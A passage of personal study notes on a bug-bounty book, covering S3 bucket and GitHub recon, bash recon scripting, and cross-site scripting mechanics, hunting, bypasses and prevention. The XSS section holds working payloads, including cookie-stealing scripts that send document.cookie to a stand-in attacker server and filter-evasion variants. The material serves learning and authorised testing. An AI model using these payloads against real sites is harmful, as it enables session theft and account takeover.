- [Lazys3](https://github.com/nahamsec/lazys3/) is a tool that helps to bruteforce S3 buckets using a wordlist to guess permutations of common bucket names.
- [Bucket Stream](https://github.com/eth0izzle/bucket-stream/) parses certificates belonging to an organization and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also checks whether the bucket is accessible to save you time.

- You'll need to install awscli to interact with buckets you've found: `pip install awscli`
- Configuration documentation can be found at https://docs.aws.amazon.com/cli/latest/userguide/cli-chap-configure.html.

Usage:

- list the contents of a bucket you've found with:
  - `aws s3 ls s3://BUCKET_NAME/`
- Copy files to your local machine:
  - `aws s3 cp s3://BUCKET_NAME/FILE_NAME/path/to/local/directory`
- Look for anything valuable such as active API keys, personal information, passwords, etc. Report these right away.
  - Exposed s3 buckets alone are often considered vulnerabilities.
- Copy a local file to the targets s3 bucket:
  - `aws s3 cp TEST_FILE s3://BUCKET_NAME/TEST_FILE`
- Remove the TEST_FILE with:
  - `aws s3 rm s3://BUCKET_NAME/TEST_FILE`
- If you can mess with the contents of an s3 bucket, you may be able to change the web application's operations or corrupt data.
- It's best to upload a "I Wuz Here" file and remove it to prove you have access, tampering with company files may result in costly lawsuits.

**GitHub Recon**

- Find the github user names associated with your target by searching the organizations name or product names or by checking the github accounts of known employees
- Find repositories related to the projects you're testing and record them, along with the usernames of the organization's top contributors, which can help you find more relevant repositories.
- Look through the Issues and Comments sections for potential info leaks, unresolved bugs, problematic code, and the most recent code fixes and security patches.
  - New patches are more likely to contain bugs
- Look at any protection mechanisms implemented to see if you can bypass them.
- Once you've found a interesting file, check the Blame and History sections at the top-right corner of the file's page to see how it was developed
- Look for hardcoded secrets like API keys, encryption keys, database passwords
- Use [Key Hacks](https://github.com/streaak/keyhacks/) to check if the creds are valid and learn how to use them to access the target's services
- Look for functions that deal with authentication, password reset, state-changing actions, or private info reads.
- Pay attention to code that deals with user input, database entries, file reads, and file uploads.
- Look for configuration files to gather more information about their infrastructure
- Look for old endpoint s and S3 bucket URLs that you can attack.

- Outdated dependencies and the unchecked use of dangerous functions are also a huge source of bugs.
- Pay attention to dependencies and imports being used and go through the versions list to see if they're outdated.
- Search for publicly disclosed vulnerabilities that would work on your target based on these outdated dependencies and imports.

Tools:

- [Gitrob](https://github.com/michenriksen/gitrob/): locates potentially sensitive files pushed to public repositories on Github.
- [TruffleHog](https://github.com/trufflesecurity/truffleHog/): specializes in finding secrets in repositories by conducting regex searches and scanning for high-entropy strings.

**Other Sneaky OSINT Techniques**

- Lookup engineer positions at the target Company
  - look for what tech is required as this will give you an idea of what tech is used by the company
- Can look for known employees github accounts, stackoverflow and Quora posts for insites into bugs/tech stack/etc.
- Look for employee accidental calendar public shares
- Social media sleuthing
  - Looking for images of post-it notes, badges with information, etc.
- Check Pastebin accounts and SlideShare
- Can use [PasteHunter](https://github.com/kevthehermit/PasteHunter/) to scan for publicly pasted data.
- Check the [Wayback Machine](https://archive.org/web/)
  - Used to find old endpoints, directory listings, forgotten subdomains, URLs, and files that are outdated but still in use.
  - [Waybackurls](https://github.com/tomnomnom/waybackurls/) to automatically extract end points and URLs from the Wayback machine.

**Tech Stack Fingerprinting**

- Use nmap with the -sV flag to perform version detection
- Send an HTTP request via burp or zap to check the HTTP headers for tech stack information
- Check the HTML source code for clues (search with CTRL+f for specifics)
- Use a browser extention like [wappalyzer](https://www.wappalyzer.com/)
- Use a website like [BuiltWith](https://builtwith.com/) or [StackShare](https://stackshare.io/) to look up infrastructure info
- Use [Retire.js](https://github.com/RetireJS/retire.js), which is a command line tool, to scan JavaScript for outdated libraries and vulnerabilities

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

#### Writing Your Own Recon Scripts

- Redirection Operators:
  - PROGRAM > FILE_NAME
    - Writes or Overwrites a file with the contents generated by PROGRAM
  - PROGRAM >> FILE_NAME
    - Appends the ouput to FILE_NAME
  - PROGRAM < FILE_NAME
    - Reads a file into PROGRAM
  - PROGRAM1 | PROGRAM2
    - Uses output from PROGRAM1 as input for PROGRAM2

**Understanding Bash Scripting Basics**
See [Scripts/recon.sh](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh).

- I've but together one file that has multiple iterations of the examples found in the book. Each individual script starts with a description and a shebang (`!#/bin/bash`) so that you can easily separate them.

**Parsing the Results**

- nmap grep command to simplify results to only PORT STATE SERVICE:
  - `grep -E "^\S+\s+\S+\s+\S+$" DIRECTORY/nmap > DIRECTORY/nmap_cleaned`
  - -E tells grep you're using a regex
  - regex consist of two parts: constants and operators.
    - Constants are sets of strings, operators are symbols that perform operations on the strings.
  - Regex operators that represent characters:
    - \d matches any digit.
    - \w matches any character.
    - \s matches any whitespace.
    - \S matches any non-whitespace.
    - . matches with any single character.
    - \ escapes a special character.
    - ^ matches the start of the string or line.
    - $ matches the end of the string or line.
    - \* matches the preceding character zero or more times.
    - \+ matches the preceding character one or more times.
    - {3} matches the preceding character three times.
    - {1, 3} matches the preceding character one to three times.
    - {1, } matches the preceding chracter one or more times.
    - [abc] matches one of the characters within the brackets.
    - [a-z] matches one of the characters within the range of a to z.
    - (a|b|c) matches either a or b or c.
  - Using this info, we can understand that our regex "^\S+\s+\S+\s+\S+$" means we should extract lines with 3 strings separated by 2 white spaces.
    - You can tell because we have 3 S (none-whitespaces = strings) and 2 s (whitespaces).
  - For regex syntax check out [RexEgg's cheat sheet](https://www.rexegg.com/regex-quickstart.html)

**Building a Master Report**

- Parse JSON files from crt.sh with jq using: `jq -r ".[] | .name_value" $DOMAIN/crt`
  - The "-r" flag tells jq to write the output to standard output rather than formatting it as JSON strings.
  - The .[] iterates through the array within the JSON file.
  - .name_value extracts the name_value field of each item.
  - $DOMAIN/crt is the input file to the jq command.
  - learn more about [jq](https://stedolan.github.io/jq/manual/)
- Combine all output files into a master report with [this script](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh).

**Scanning Multiple Domains**

- We use the getopts tool to parse options from the command line by using single character flags.
- To implement multi-domain scanning functionality, we can assign the -m flag to specify the scan mode and assume that all other arguments are domains.
  - Tell `getopts` to recognize an option if the option flag -m is used and that this option should contain an input value.
  - The getopts tool automatically stores the value of any options in the $OPTARG variable.
  - We can store that value in the variable `MODE`.
    - `getopts "m:" OPTION`
      `MODE=$OPTARG`
  - getopts stop parsing arguments when it encounters an argument that doesn't start with a - character.
    - Because of this, you'll need to place the scan mode before the domain arguments when running the script.
    - ex. `.recon.sh -m nmap-only facebook.com fbcdn.net`
- We need to use a loop to iterate through our domains.
  - When you know how many values you will be looping through, use a for loop.
  - When you dont know how many value you will be looping through, use a while loop.
- Bash for loop syntax:
  - `for i in LIST_OF_VALUES
do
  DO SOMETHING
done`
- Implementing the functionality:

```
for i in "${@:$OPTIND:$#}"
do
  # Do the scans for $i
done
```

- "${@:$OPTIND:$#}" is an array that contains every command line argument, besides the ones that are already parsed by getopts. It stores the index of the first argument after the options it parses into a variable named `$OPTIND`.

  - $@ represent the array containing all input arguments.
  - $# is the number of the command line arguments passed in.
  - "${@:OPTIND:}" slices the array so that it removes the MODE argument, like nmap-only, making sure that we iterate through only the domains part of our input.
  - Array slicing is a way of extracting a subset of items from an array.
  - Bash array slicing syntax:
    - "${INPUT_ARRAY:START_INDEX:END_INDEX}"
      - the quotes (" ") around the command are necessary.

- The following are bash comparison evaluators you can use to change the functionality depending on what you're doing:
  - -f flag tests whether a file exists.
  - -eq tests if something equals something else. `if [ $3 -eq 1 ]`
  - -ne tests if something is not equal to something else. `if [ $3 -ne 1 ]`
  - The following are tests for greater than, less than, and their equal to variations:
    - `if [ $3 -gt 1 ]`
    - `if [ $3 -ge 1 ]`
    - `if [ $3 -lt 1 ]`
    - `if [ $3 -le 1 ]`
  - -z and -n flags test whether a string is empty, the following are both true:
    - `if [ -z "" ]`
    - `if [ -n "abc" ]`
  - -d, -f, -r, -w, -x, check for directory or file statuses. The following will all return true if the files, directories, or permissions are exists or are true:
    - `if [ -d /bin ]`
    - `if [ -f /bin/bash ]`
    - `if [ -r /bin/bash ]`
    - `if [ -w /bin/bash ]`
    - `if [ -x /bin/bash ]`
  - You can also use the && and || operators to combine and test expressions.
  - The following returns true if both expressions are true:
    - `if [ $3 -gt 1 ] && [ $3 -lt 3 ]`
  - The following returns true if at least one of them is true:
    - `if [ $3 -gt 1 ] || [ $3 -lt 0 ]`
  - You can find more comparison flags in the test command by running `man test` (if you have man installed)

**Writing a Function Library**
"As your codebase get larger, you should consider writing a _function library_ to reuse code. We can store all the commonly used functions in a separated file called scan.lib. That way, we can call these functions as needed from future recon tasks." Alright, lets do it!

- Create a file called scan.lib and add the functions we have so far. See the scripts under "# A variation of the script utilizing a function library:" in [recon.sh](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh). The function library can be found in [scan.lib](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/recon.sh)
- "You might build multiple networking tools that all require DNS resolution. In this case, you can simply write the functionality once and use it in all of your tools"

**Building Interactive Programs**

- To make an interactive program, we will need to utilize while loops. As long as the CONDITION is true, the while loop will execute the code between do and done repeatedly.
- ex.:
  `while CONDITION
do
  DO SOMETHING
done`
- We can use a while loop to repeatedly prompt the user for a new domain until they quit the program:
  `while [ $INPUT != "quit" ];do
  echo "Please enter a domain:
  read INPUT
  if [ $INPUT != "quit" ];then
    scan_domain $INPUT
    report_domain $INPUT
  fi
done`
- to invoke the -i option, we can use a while loop to parse option by using getopts repeatedly.
  `while getopts "m:i" OPTION;do
  case $OPTION in 
    m)
      MODE=$OPTARG
      ;;
    i)
      INTERACTIVE=true
      ;;
  esac
done`
- The final version of the script (this one including the interactive mode), can be found in the standalone script [recon.sh]()
- "Interactive tools can help your workflow operate more smoothly. For example, you can build testing tools that will let you choose how to proceed based on preliminary results."

**Using Special Characters**

- In Unix, commands return 0 on success and a positive integer on failure.
- `$?` contains the exit value of the last command executed.
- You can test for execution success and failures with something like this:
  `#!/bin/sh
chmod 777 scripts.sh 
if [ "$?" -ne "0";then
  echo "Chmod failed. You might not have permissiosn to do that."
fi`
- `$$` contains the current process's ID.
  - This special variable can be useful when you run multiple instances of the same script and need to create temporary files for that script.
  - To do this, use something like `/tmp/script_name_$$` to separate the different temporary files by process ID.
- "Variables that aren't input parameters are global to the entire script. If you want other programs to use the variable as well, you need to export the variable:
  `export VARIABLE_NAME=VARIABLE_VALUE"
  - I commonly do this with things like the IP address I'm pen-testing (if singular): `export IP=192.168.0.45`
  - "If you don't export a variable or source it in another script, the value gets destroyed after the scripts exists. But if you export the (variable) in the first script and run the script and run the script before running a second script, the second script will be able to read (the variables) value."
- `*` stands for all.
  - to list all files in the directory that end in the extension .txt you can use: `ls *.txt`
- Backticks "`" indicate command substitution. They can be used in place of $().
- `echo $(whoami)` can be written as:
  ```
  echo `whoami`
  ```
- Special characters are not read as special characters if placed in quotes.
  - `echo "abc '*' 123"` will print the string: `"abc '*' 123"`
- The backslash is the escape character.
  - Here's some good examples from the book:
  - "`$ echo "\" is a double quote.\$ is a dollar sign.`
  - `` \` is a backtick. \\ is a blackslash."``
  - You can also use a \ to indicate that a line of code has not ended after the line break:
  - `chmod 777 \
script.sh` - This is the same as: `chmod 777 script.sh`
- At the end of this section, the author suggests using building automation scripts as a way to build your hacking methodology. They also suggest to make a directory for your scripts and organize them by different categories (recon, fuzzing, automated reporting, etc).
  - organizing your scripts and making function libraries is a good way to be able to easily incorporated new tools into your hacking workflow.

**Scheduling Automatic Scans**

- We will use _Cron_ to schedule our scripts.
- Edit your users _crontabs_ by running `crontab -e`
- Crontab syntax:
  `A B C D E command_to_be_executed
A: Minute (0 - 59)
B: Hour (0 - 23)
C: Day (1 - 31)
D: Month (1 - 12)
E: Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1)`
- The `run-parts` command in crontabs tells Cron to run all the scripts stored in a directory.
  - ex: `30 21 * * * run-parts /Users/vickie/scripts/security`
  - This command will run all of the scripts located in /Users/vickie/scripts/security at 9:30PM.
- Schedule a diff tasks to compare scans to see if anything has changed between two scans: `diff SCAN_1 SCAN_2`
  - This can help to identify new domains, subdomains, endpoints, and other new assets of a target when they appear in a new scan of the same domain.
  - Sample script:
    `#!/bin/bash
DOMAIN=$1 
DIRECTORY=$DOMAIN_recon
echo "Checking for new changes about the target: $DOMAIN.\n Found these new things."
diff <SCAN AT TIME 1> <SCAN AT TIME 2>`
  - You would then schedule this script to run at an interval that makes sense to you.
- Github has a Notification feature that will tell you when significant events on a repository occur.
  - Turn it on by navigating to Settings > Notifications, then set up an email for github to send notifications to, to get alerts.
  - You then just need to setup a crontab for updating your github repo, or write the updating of github repos into your scripts.

[Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)

### Cross-site Scripting

- Cross-site scripting vulnerabilities are one of the most common web vulnerabilities (As of 2020, but they're still quite common).

#### Mechanisms

- "In an XSS attack, the attacker injects an executable script into HTML pages viewed by the user. This means that to understand XSS, you'll have to first understand JavaScript and HTML syntax"
- Here's an HTML syntax [cheat sheet](https://web.stanford.edu/group/csp/cs21/htmlcheatsheet.pdf) found on Stanford University's website.
- Here's a JavaScript syntax [cheat sheet](https://www.codewithharry.com/blogpost/javascript-cheatsheet/) from codewithharry.com.

- In HTML, look for the <script></script> tags.
- When you find <script></script> tags embedded in HTML files, you're looking at an "inline" script. That is to say, they're embedded in the HTML of the page, and not loaded from an external file.
  - These are great targets to test for XSS.
- An example of an inline script:

```
<h1>Welcome to my site.</h1>
<h3>This is a cybersecurity newsletter that focuses on bug bounty news and write-ups. Please subscribe to my newsletter below to receive new cybersecurity articles in your email inbox.</h3>
<form action="/subscribe" method="post">
  <label for="email">Email:</label><br>
  <input type="text" id="email" value="Please enter your email.">
  <br><br>
  <input type="submit" value="Submit">
</form>
```

- The confirmation HTML looks like this:

```
<p>Thanks! You have subscribed <b>user@gmail.com</b> to the newsletter.</p>
```

- If the user were to submit `<script>location="http://attacker.com;</script>` into the email field, and the website doesn't validate or sanitize the user input, their source code would become, `<p>Thanks! You have submitted <b><script>location="http://attacker.com";</script></b> to the newsletter.</p>`
- Validating user input: The application checks that the user input meets a certain standard - like not containing malicious code or follows some sort of structural guide.
- Sanitizing user input: The application modifies special characters in the input that can be use to interfere with HTML logic before processing.
- The `src` attribute of the HTML <script> tag allows you to load JavaScript from an external source.
  - `<script src=http://attacker.com/xss.js></script>` will execute the contents of http://attacker.com/xss.js in the victim's browser.
  - This is not very useful, because the attacker can only redirect themselves to the attack website.
- If the website allows users to subscribe to the service by visiting a URL like "https://subscribe.example.com?email=SUBSCRIBER_EMAIL" to automatically subscribe after visiting the URL, the attacker can inject the script by tricking users into visiting a malicious URL like, `https://subscribe.example.com?email=<script>location="http://attacker.com";</script>`
  - The malicious script get incorporated into the page and the victim's browser will think the script is part of that site.
  - The injected script can then access any resources that the browser stores for that site (cookies, session tokens, etc.).
  - This can be used to steal user information that can then be used to bypass access controls.
- To steal cookies by making the victim's broswer send a request to the attacker's IP with the victim's cookie as a URL parameter, you could use something like the following:
  `<script>image = new Image();
image.src='http://attacker_server_ip/?c='+document.cookie;</script>`
  - This script contains JavaScript to load an image from the attacker's server with the user's cookies as part of the request.
- XSS can be used to execute actions on the victim's behalf, modify the webpage the victim is viewing, read the victim's sensitive information (CSRF tokens, credit card numbers, and any other details rendered on their page)

#### Types of XSS

Stored XSS (Includes Blind XSS), Reflected XSS, DOM-based XSS.

- The difference between these types is how the XSS payload travels before it gets delivered to the victim users.

**Stored XSS**

- When user input is stored on a server and retrieved unsafely.
- "When an application accepts user input without validation, stores it in its servers, and then renders it on users' browsers without sanitization, malicious JavaScript code can make its way into the database and then to victim's browsers."
- Stored XSS is the most severe XSS type.
  - This is because it can attack the most amount of users.
- In the worst case scenario, all a user would need to do to become a victim is to view a page that has the payload embedded in it.
- You can inject the script in the application's user database, in their server logs, on a message board, or in a comment field.
  - Every time a user accesses the stored information, the XSS executes in their browser.
  - ex.: If you find a comment field on a blog that is vulnerable to XSS, an attack can submit a comment with JavaScript code and have that code executed by any user who views the blog post.
- Proof of Concept (POC) for XSS: generate a pop-up on the victim's browser:
  `<p><script>alert('Vulnerable to XSS');</script></p>`
  - Here's what it could look like in the HTML of a vulnerable comment section:
  ```
  <h2>Regular User's message</h2>
  <p>What a great post!</p>
  <h2>Attacker's message</h2>
  <p><script>alert('Vulnerable to XSS')</script></p>
  ```
  - In this example, the attackers message won't be shown in the comment section because it is interpreted as a script. If successful, the pop-up alert will be displayed instead.

**Blind XSS**

- "_Blind_ XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see."
- Blind XSS can be used to attack administrators (by submitting XSS payloads to support staff through ticketing portals, for example), exfiltrate data, and compromise their accounts.

**Reflected XSS**

- "_Reflected_ XSS vulnerabilities happen when user input is returned to the user without being stored in a database. The application takes in user input, processes it server-side, and immediately returns it to the user."
- "These issues often happen when the server relies on user input to construct pages that display search results or error messages."
- Example: A website has a search field that is vulnerable to Reflected XSS.
  - When used as intended, the response might look something like this if you search "adc":
    `<h2>You searched for abc; here are the results!</h2>`
  - If you inject an XSS payload into the search parameter, it may look something like this:
    `https://example.com/search?q=<script>alert('Vulnerable to XSS');</script>`
    - After injecting the XSS payload and the website generates the new page containing the search results (or in this case our malicious payload), the attacker would then share the link to the malicious page to attack users.
    - The benefit here is you could have a URL that looks like one people trust, but is in fact malicious.
    - ex.: www.facebook.com/search?q=<XSSpayload>
    - This requires the attacker to get victims to click the malicious link.

**(Document Object Model) DOM-Based XSS**

- "_DOM-based_ XSS is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user's browser. In DOM-based XSS, the application takes in user input, processes it on the victim's browser, and then returns it to the user."
- A "DOM" is a model that browsers use to render a web page.
- A DOM represents a web page's structures which defines basic properties and behavior for each HTML element and helps scripts access and modify the contents of the page.
- DOM-Based XSS targets the DOM directly; it attacks the client's local copy of the web page, it does not go through the server.
- JavaScript libraries like jQuery are often subject to DOM-Based XSS because they dynamically alter DOM elements.
- The XSS script is never sent to the server, so the HTTP response from the server doesn't change.
- ex.: A website allows the user to change their locale by submitting to a URL parameter:
  `https://example.com?local=north+america`
  - Submitting this will generate a client side response similar to:
    `<h2>Welcome, user from North America!</h2>`
  - This submission is used locally by the user's browser with a client-side script.
  - If the submission is not validated by the client-side script, the attacker could trick victim's into visiting a URL like:
    `https://example.com?local=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>`
- "The user input fields that can lead to reflected and DOM-based XSS aren't always URL parameters. Sometimes they show up as URL fragments or pathnames."
  - URL _fragments_ are strings, located at the end of a URL, that begin with a # character.
  - Github uses these a lot to allow content creators to link to different sections within a longer .md file (like this one, you can view the RAW version of this document and see where the Table of Contents (TOC) links to different sections).
- Information and payload examples from [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/)

**Self-XSS**

- "_Self-XSS_ attacks require victims to input a malicious payload themselves. To perform these, attackers must trick users into doing much more than simply viewing a page or browsing to a particular URL."
- "If you've ever seen social media posts or text messages telling you to paste a piece of code into your browser to "do something cool," it was probably attack code aimed at tricking you into launching self-XSS against yourself.
- These are often out of scope, because they require you to use social engineering to attack users directly.

**Prevention**

- Two main controls to prevent XSS:
  - Robust input validation.
  - Contextual output escaping and encoding.
- Apps should never insert user-submitted data directly into an HTML document.
  - Including inside <script> tags, HTML tag names, or attribute names.
  - The server should validate the user-submitted input doesn't contain dangerous characters that might influence the way browsers interpret the information.
  - You could block all requests that contain the <script> tag, for example, or sanitize it by removing or escaping special characters before further processing.
- Escaping is when you encode special characters so that they're interpreted literally instead of as special characters.
  - Encoding must be done in the format of the language being used (JavaScript for JavaScript, HTML for HTML, XML, JSON, CSS, etc.)
  - For HTML, "<" and ">" can be escaped with &lt and &gt.
- Escaping special characters so that the application won't interpret user input as code to execute is the most common way for modern apps to protect against XSS attacks.

  - React, Angular 2+, and Vue.js do this automatically, so choosing the right framework is a great way to protect your applications.

- DOM-based XSS, however, doesn't get passed to the server, so sanitization won't work.
- To protect against DOM-based XSS, devs should avoid code that rewrites the HTML doc based on user input, and should implement client-side input validation before it's inserted into the DOM.

- To mitigate against the damage of successful XSS attacks:
  - Set the `HttpOnly` flag on sensitive cookies to prevent attackers from stealing those cookies.
  - Implement the `Content-Security-Policy` response header to restrict how resources like JavsScript, CSS, or images load on your web pages.
  - You can instruct the browser to execute only scripts from a list of sources.
  - Visit [OWASP XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheet/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) for even more info.

#### Hunting for XSS

- Look for places where user input get rendered on a page, check for reflected user input.
- You can look for XSS in applications that communicate via non-HTTP protocols like SMTP, SNMP, DNS.
  - The book suggestion checking out [Offensive Security's Advanced Web Attacks and Exploitation Training](https://www.offensive-security.com/awae-oswe/) if you're interested in these techniques.

**Step 1: Look for Input Opportunities**

- For Stored XSS, look for places where input get stored by the server and later displayed to the user: Comment fields, user profiles, and blog posts.
- For Reflected XSS, look for forms, search boxes, name and username fields in sign-ups.
- Don't limit yourself to text input fields. Drop-down menus and numeric fields also can allow for XSS through the use of a proxy (like BuprSuite).

  - ex:

  ```
  POST /edit_user_age

  (Post request body)
  age=20
  ```

  - Could be tested with:

  ```
  POST /edit_user_age

  (Post request body)
  age=<script>alert('Vulnerable to XSS');</script>
  ```

- For reflected and DOM XSS, look for user input in URL parameters, fragments, or pathnames that get displayed to the user.
  - Insert a custom string into each URL parameter and check whether it shows up in the returned page. Make the string very specific to make sure it was caused by the submission.
  - Input the string "Vulnerable to XSS" into every user-input opportunity you can find, then search the pages source code for it with ctrl+f.

**Step 2: Insert Payloads**

- Once you've found some user input opportunities, start testing with XSS payloads. An alert payload is simple and effective:
  `<script>alert('Vulnerable to XSS');</script>`

  - This is nice because you get a pop-up if the attack is successful.
  - This is less likely to work on modern web apps, but is more likely to work on IoT or embedded applications that don't use the latest frameworks.
  - For IoT learning check out OWASP's [IoTGoat project](https://github.com/OWASP/IoTGoat/)

- Changing the values of attributes in HTML tags is another way to try to sneak a payload into a web application.
  - ex. of the `onload` event attribute running a script after the HTML element has loaded (similar for `onclick` and `onerror` event attributes):
    `<img onload=alert('The image has been loaded!') src="example.png">`
  - You can try inserting code into these attributes or adding a new event attribute into an HTML tag.
- Try to achieve an XSS through special URL schemes like `javascript:` and `data:`.

  - `javascript:` URL scheme allows you to execute JavaScript code specified in the URL.
    `javascript:alert('Vulnerable to XSS')`
  - The `data:` scheme allows you to embed small files in a URL, including JavaScript code:
    `data:text/html:base64,PHNjcmlwdD5hbGVydCgnVnVsbmVyYWJsZSB0byBYU1MnKTwvc2NyaXB0Pg==`
  - The above is the base64 encoded version of: `data:text/html:base64.<script>alert('Vulnerable to XSS')</script>`
  - You don't need to base64 encode, but it's always a good idea to try this if a non-encoded payloads don't work as it can help bypass XSS filters (and any other injection filters for that matter).
  - For more ways to execute JavaScript by bypassing XSS protection you can look on PortSwigger's [cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/) for payload examples.
  - It can be helpful to use multiple browsers to test for XSS because different browsers support different tags and event handlers.

- "When inserting an XSS payload, you'll often have to close out a previous HTML tag by including its closing angle bracket. This is necessary when you're placing your user input inside one HTML element but want to run JavaScript using a different HTML element."
  - Doing this avoids syntax errors.
  - ex:
    `<img src="USER_INPUT">`
  - To close out the tag, you would need supply the following to the input field:
    `"/><script>location="http://attacker.com";</script>`
  - The target would then receive this:
    `<img src=""/><script>location="http://attacker.com";</script>">`
  - Use a proxy to check if the payload has caused syntax errors in the returned document.
  - Use your browser to see if there are any errors loading the page.

Table 6-1: Common XSS Payloads  
 |Payload|Purpose|
|---|---|
|`<script>alert(1)</script>`| This is the most generic XSS payload. It will generate a pop-up box if the payload succeeds|
|`<iframe src=javascript:alert(1)>`| This payload loads JavaScript code within an iframe. It's useful when <script> tags are banned by the XSS filter|
|`<body onload=alert(1)>`| This paylaod is useful when your input string can't contain the term _script_. It inserts an HTML element that will run JavaScript automatically after it's loaded.|
|`"><img src=x onerror=prompt(1);>`| This payload closes out the previous tag. It then injects an <img> tag with an invalid source URL. Once the tag fails to load, it will run the JavaScript specified in the onerror attribute.|
|`<script>alert(1)<!-`| <! is the start of an HTML comment. This payload will comment out the rest of the line in the HTML document to prevent syntax errors.|
|`<a onmouseover"alert(1)">test</a>`| This payload inserts a link that will cause JavaScript to execute after a user hovers over the link with their cursor.|
|`<script src=//attacker.com/test.js>`|This payload causes the browser to load and run an external script hosted on the attacker's server.|

- Instead of testing the many payloads one by one to see if the application you're working on is vulnerable, you can use a polyglot.
  - A polyglot is a payload that executes in multiple contexts - it will execute regardless of being inserted into an <img> tag, a <script> tag, or a generic <p> tag and can also bypass some XSS filters.
- ex. from [EdOverflow](https://polyglot.innerht.ml/):

```
javascript:"/*\"/*' /*</template>
</textarea></noembed></noscript></title>
</style><script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

- The above polyglot contains multiple ways of creating an XSS so if one method fails, another method could still work.
- Another efficient way of testing for XSS is to use generic test strings like: `>'<"//:=;!--`
  - You can use a generic string like this to see which special characters are escaped, and which ones aren't.
  - If you find that some or all of the special characters are not escaped, you can then build a payload around the ones that aren't.
- Blind XSS are harder to detect because you cannot see the reflected input, and you can't test them by generating an alert box.
  - To test them, you'll need to try to make a victim's browser generate a request to a server of your own.
  - ex: Submit the following payload which will make the victim's browser request the page /xss on your server:
    `<script src='http://YOUR_SERVER_IP/xss'></script>`
  - You will then inspect your server logs to see if anyone requests that page. If you see a request to /xss, the XSS was successful.
- Fuzzing is a great way to test for XSS automatically is through fuzzing. This is covered in Chapter 25.
  - Note: Hackers generally discover new XSS manually, but a good way to find out where to start can be done through fuzzing.

**Step 3: Confirm the Impact**

- Keep in mind that the site may use the user input to construct something other than the next returned page.
  - Your input should be use to construct other web pages, email, and file portals.
  - There may be a time delay between when you submit the payload and when it executes. Common in log files and analytics pages.
    - If targetting log files and analytic pages, your payload may be executed later or in another users account.
  - Payloads may only execute under certain conditions, like an admit being logged in, or when the user actively clicks or hovers certain HTML elements.
  - Browse to the necessary pages and perform these actions yourself - if possible.

#### Bypass XSS Protection

**Alternative JavaScript Syntax**

- `<script><script/>` tags are often filtered out, instead you could use an HTML image tag, `<img src="USER_INPUT">`
- Instead of closing out an img tag and inserting a script tag (`<img src="/><script>alert('Vulnerable to XSS');</script>"/>`), you could insert the JavaScript directly as an attribute to the current tag: `<img src="123" onerror="alert('Vulnerable to XSS');"/>`
- Use the special URL schemes from earlier: `<a href="javascript:alert('Vulnerable to XSS')>Click me!</a>"`

**Capitalization and Encoding**

- "You can also mix different encodings and capitalizations to confuse the XSS filter. For example, if the filter filters for only the string "script", capitalize certain letters in your payload": `<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>`
- If the app filters special HTML characters like single and double quotes, you could use the JavaScript `fromCharCode()` function which maps numeric codes to the corresponding ASCII characters.
  - The following is equivalent to `"http://attacker_server_ip/?c="`:
    `String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)`
  - Using this in conjunction with capitalization could look like this: `<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookies;</scrIPT>`
  - You can convert strings using an online JavaScript editor like [https://js.do/](https://js.do) by copying the following code and changing `encoded = "INPUT_STRING"` to whatever you're trying to translate and then clicking the "Run code" button on the top left of the code window:
    ```
    <script>
    function ascii(c){
      return c.charCodeAt();
    }
    encoded = "INPUT_STRING".split("").map(ascii);
    document.write(encoded);
    </script>
    ```
  - I've written a python script to be able to convert strings locally or to be used in a larger framework [here](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/Scripts/convert_to_charcode.py).

**Filter Logic Errors**

- "...sometimes application remove all `<script>` tags in the user input to prevent XSS, but do it only once. If that's the case, you can use a payload like this:"
  `<scrip<script>t>
location='http://attacker_server_ip/c='+document.cookie;
</scrip</script>t>`
  - By cutting the script tag in two, the filter may not recognize the broken script tag and once the complete script tag is removed, the intact script tag forms the payload.
- XSS protection is hard to do right, that's why XSS is still prevalent today.
- More filter-bypass ideas on OWASP's XSS filter evasion [cheat sheet](https://owaps.org/www-community/xss-filter-evasion-cheatsheet).
  - Or, Google XSS "filter bypass".

**Escalating the Attack**

- Stored XSS on a public forum can attack anyone who visits the forum page, and is considered the most severe.
- Reflected or DOM XSS can only affect users who click the malicious link.
- If you find a stored XSS vulnerability in server logs, the XSS can take over admin sessions.
  - If you can take over one of these high privileged accounts, the XSS could compromise the integrity of the entire application.
  - You could gain access to customer information, internal files, API keys, you might even be able to escalate into RCE by uploading a shell or execute scripts as the admin.
- You may also be able to steal the Cross Site Request Forgery (CSRF) token embedded on the victim's page. If you can steal the CSRF token, you can execute actions on their behalf by using those tokens to bypass CSRF protections (Chapter 9).
- "XSS can also be used to dynamically alter the page the victim sees, so you can replace the page with a fake login page and trick the user into giving you their credentials."
- "XSS can also allow attackers to automatically redirect the victim to malicious pages and perform other harmful operations while posing as the legit site, such as installing malware."

**Automating XSS Hunting**

- Use tools to make your XSS hunt more efficient instead of inspecting all of the different request parameters individually.
- Use browser developer tools to look for syntax errors and troubleshoot your payloads.
  - Use a proxy's search tool to search server responses for reflected input.
- Use BurpSuite or Zap to do an automatic XSS scan on the target.

**Finding Your First XSS!**

